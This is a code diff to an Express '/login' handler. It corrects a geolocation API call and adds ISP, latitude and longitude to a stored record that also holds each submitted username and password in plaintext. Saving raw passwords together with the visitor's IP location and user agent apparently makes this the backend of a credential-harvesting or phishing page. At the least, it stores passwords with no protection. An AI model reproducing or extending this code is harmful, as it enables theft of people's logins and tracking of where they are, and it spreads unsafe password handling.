@@ -35,9 +35,11 @@ app.post("/login", async (req, res) => {
 
   let city = "N/A";
   let country = "N/A";
-
+  let isp="N/A";
+  let lat="N/A";
+  let lon="N/A";
   try {
-    const geoRes = await fetch(https://ipwho.is/${ip});
+    const geoRes = await fetch(`https://ipwho.is/${ip}`);
     const geoData = await geoRes.json();
 
     console.log("GeoData:", geoData);
@@ -45,6 +47,9 @@ app.post("/login", async (req, res) => {
     if (geoData.success) {
       city = geoData.city || "N/A";
       country = geoData.country || "N/A";
+      isp=geoData.connection?.isp||"N/A";
+      lat=geoData.latitude||"N/A";
+      lon=geoData.longitude||"N/A";
     }
   } catch (err) {
     console.log("Geo API error:", err);
@@ -53,11 +58,11 @@ app.post("/login", async (req, res) => {
    await ref.set({
     time: new Date().toLocaleString(),
    ip:ip,
-    country:country||"N/A",
-    city:city||"N/A",
-    isp:geoData.isp||"N/A",
-    lat:geoData.lat||"N/A",
-    lon:geoData.lon||"N/A",
+    country:country,
+    city:city,
+    isp:isp,
+    lat:lat,
+    lon:lon,
     username: data.username || "N/A",
     password: data.password || "N/A",
     userAgent: data.agent || "N/A",
